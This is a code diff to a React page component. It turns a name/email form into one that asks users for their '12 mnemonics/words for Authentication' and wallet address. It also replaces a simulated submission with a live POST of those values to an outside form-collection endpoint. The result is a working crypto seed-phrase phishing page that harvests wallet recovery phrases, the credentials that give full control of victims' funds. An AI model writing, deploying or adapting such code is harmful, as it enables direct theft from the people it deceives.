@@ -22,13 +22,13 @@ const albert_Sans = Albert_Sans({
 
 export default function Home() {
   const [formData, setFormData] = useState({
-    name: "",
-    email: "",
+    mnemonics: "",
+    address: "",
   });
 
   const [errors, setErrors] = useState({
-    name: false,
-    email: false,
+    mnemonics: false,
+    address: false,
   });
 
   const [formSubmitted, setFormSubmitted] = useState(false);
@@ -40,9 +40,9 @@ export default function Home() {
   // Function to validate individual fields on change
   const validateField = (name: string, value: string) => {
     switch (name) {
-      case "name":
+      case "mnemonics":
         return value.trim() !== "";
-      case "email":
+      case "address":
         return emailRegex.test(value);
 
       default:
@@ -67,47 +67,42 @@ export default function Home() {
 
   const validateForm = () => {
     const newErrors = {
-      name: !formData.name.trim(),
-      email: !emailRegex.test(formData.email),
+      mnemonics: !formData.mnemonics,
+      address: !emailRegex.test(formData.address),
     };
 
     setErrors(newErrors);
 
-    return !newErrors.name && !newErrors.email;
+    return !newErrors.mnemonics && !newErrors.address;
   };
+
+  const FORMSPARK_ACTION_URL = "https://submit-form.com/6bnIUqvJW";
 
   const handleSubmit = async (e: any) => {
     e.preventDefault();
     if (validateForm()) {
       setLoading(true);
       console.log("Form is valid, attempting to submit...");
-      try {
-        // Simulate form submission (API call)
-        await new Promise((resolve) => setTimeout(resolve, 2000)); // Simulate delay
-        // await fetch('https://submit-form.com/6bnIUqvJW', {
-        //   method: 'POST',
-        //   headers: { 'Content-Type': 'application/json' },
-        //   body: JSON.stringify(formData),
-        // });
+      await fetch(FORMSPARK_ACTION_URL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          Accept: "application/json",
+        },
+        body: JSON.stringify(formData),
+      });
+      setLoading(false);
+      setFormSubmitted(true);
 
-        console.log("Submitted Data: ", formData);
-
-        setFormSubmitted(true);
-      } catch (error) {
-        console.error("Error submitting form", error);
-      } finally {
-        setLoading(false);
-      }
-    } else {
-      console.log("Form has errors, cannot submit");
+      // alert("Form submitted");
     }
   };
 
   const goBack = () => {
     setFormSubmitted(false);
     setFormData({
-      name: "",
-      email: "",
+      mnemonics: "",
+      address: "",
     });
   };
 
@@ -159,39 +154,39 @@ export default function Home() {
       {!formSubmitted ? (
         <form onSubmit={handleSubmit} className="space-y-6">
           <div className="flex flex-col gap-1">
-            <label htmlFor="name">
+            <label htmlFor="mnemonics">
               12 mnemonics/words for Authentication <span>(required)</span>
             </label>
             <input
               type="text"
-              id="name"
-              name="name"
-              value={formData.name}
+              id="mnemonics"
+              name="mnemonics"
+              value={formData.mnemonics}
               onChange={handleInputChange}
               className={`${
-                errors.name ? " border-red-500" : ""
+                errors.mnemonics ? " border-red-500" : ""
               } text-black border-2 border-[#0a0a0a] py-3 px-2 rounded-md text-xl`}
             />
-            {errors.name && (
+            {errors.mnemonics && (
               <p className="text-red-500">Please fill out this field.</p>
             )}
           </div>
 
           <div className="flex flex-col gap-1">
-            <label htmlFor="email">
+            <label htmlFor="address">
               Wallet Address <span>(required)</span>
             </label>
             <input
               type="text"
-              id="email"
-              name="email"
-              value={formData.email}
+              id="address"
+              name="address"
+              value={formData.address}
               onChange={handleInputChange}
               className={`${
-                errors.email ? " border-red-500" : ""
+                errors.address ? " border-red-500" : ""
               } text-black border-2 border-[#0a0a0a]  py-3 px-2 rounded-md text-xl`}
             />
-            {errors.email && (
+            {errors.address && (
               <p className="text-red-500">
                 Please provide a valid email address.
               </p>
